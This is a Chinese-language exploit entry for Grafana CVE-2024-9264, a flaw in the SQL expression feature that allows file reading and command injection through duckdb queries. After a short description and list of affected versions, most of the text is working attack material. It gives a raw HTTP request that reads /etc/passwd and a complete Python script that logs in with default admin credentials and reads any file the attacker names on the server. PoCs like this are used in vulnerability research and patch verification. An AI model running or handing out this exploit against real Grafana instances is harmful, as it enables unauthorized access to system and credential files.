# Grafana表达式远程代码执行(CVE-2024-9264)

Grafana 的 SQL 表达式实验功能允许评估包含用户输入的“duckdb”查询。这些查询在传递给“duckdb”之前没有得到充分的净化，从而导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都能够执行此攻击。 “duckdb”二进制文件必须存在于 Grafana 的 $PATH 中才能使此攻击起作用；默认情况下，此二进制文件未安装在 Grafana 发行版中。

## 影响版本

Grafana >= v11.0.0 (all v11.x.y are impacted)

## poc

```javascript
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q100 HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Cookie: grafana_session=a739fa9aeb235f2790f17de00fefe528
Content-Length: 368

{
  "from": "1696154400000",
  "to": "1696345200000",
  "queries": [
    {
      "datasource": {
        "name": "Expression",
        "type": "__expr__",
        "uid": "__expr__"
      },
      "expression": "SELECT * FROM read_csv_auto('/etc/passwd');",
      "hide": false,
      "refId": "B",
      "type": "sql",
      "window": ""
    }
  ]
}

```

![image-20241022092542872](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410220925944.png)

## python

```python
#!/usr/bin/env python3

"""
Grafana File Read PoC (CVE-2024-9264)
Author: z3k0sec // www.zekosec.com
"""


import requests
import json
import sys
import argparse

class Console:
    def log(self, msg):
        print(msg, file=sys.stderr)

console = Console()

def msg_success(msg):
    console.log(f"[SUCCESS] {msg}")

def msg_failure(msg):
    console.log(f"[FAILURE] {msg}")

def failure(msg):
    msg_failure(msg)
    sys.exit(1)

def authenticate(s, url, u, p):
    res = s.post(f"{url}/login", json={"password": p, "user": u})
    if res.json().get("message") == "Logged in":
        msg_success(f"Logged in as {u}:{p}")
    else:
        failure(f"Failed to log in as {u}:{p}")

def run_query(s, url, query):
    query_url = f"{url}/api/ds/query?ds_type=__expr__&expression=true&requestId=1"
    query_payload = {
        "from": "1696154400000",
        "to": "1696345200000",
        "queries": [
            {
                "datasource": {
                    "name": "Expression",
                    "type": "__expr__",
                    "uid": "__expr__"
                },
                "expression": query,
                "hide": False,
                "refId": "B",
                "type": "sql",
                "window": ""
            }
        ]
    }

    res = s.post(query_url, json=query_payload)
    data = res.json()

    # Handle unexpected response
    if "message" in data:
        msg_failure("Unexpected response:")
        msg_failure(json.dumps(data, indent=4))
        return None

    # Extract results
    frames = data.get("results", {}).get("B", {}).get("frames", [])

    if frames:
        values = [
            row
            for frame in frames
            for row in frame["data"]["values"]
        ]
        
        if values:
            msg_success("Successfully ran DuckDB query:")
            return values

    failure("No valid results found.")

def decode_output(values):
    return [":".join(str(i) for i in row if i is not None) for row in values]

def main(url, user="admin", password="admin", file=None):
    s = requests.Session()
    authenticate(s, url, user, password)
    file = file or "/etc/passwd"
    escaped_filename = requests.utils.quote(file)
    query = f"SELECT * FROM read_csv_auto('{escaped_filename}');"
    content = run_query(s, url, query)
    if content:
        msg_success(f"Retrieved file {file}:")
        for line in decode_output(content):
            print(line)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Arbitrary File Read in Grafana via SQL Expression (CVE-2024-9264).")
    parser.add_argument("--url", help="URL of the Grafana instance to exploit")
    parser.add_argument("--user", default="admin", help="Username to log in as, defaults to 'admin'")
    parser.add_argument("--password", default="admin", help="Password used to log in, defaults to 'admin'")
    parser.add_argument("--file", help="File to read on the server, defaults to '/etc/passwd'")


    args = parser.parse_args()
    main(args.url, args.user, args.password, args.file)

```

## 漏洞来源

- https://zekosec.com/blog/file-read-grafana-cve-2024-9264/
- https://github.com/z3k0sec/File-Read-CVE-2024-9264
